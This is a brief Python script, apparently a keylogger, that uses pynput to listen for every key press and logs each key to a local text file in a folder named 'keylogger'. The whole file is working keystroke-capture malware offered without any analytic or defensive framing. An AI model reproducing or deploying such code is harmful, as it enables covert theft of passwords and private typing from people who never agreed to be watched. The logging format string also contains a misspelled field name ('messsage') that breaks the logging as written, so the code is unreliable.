from pynput.keyboard import Key, Listener
import logging

log_dir = ''
logging.basicConfig(filename=(log_dir + "C:\python_\keylogger\keylog.txt"),
                    level=logging.DEBUG, format='["%(asctime)s", %(messsage)s')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
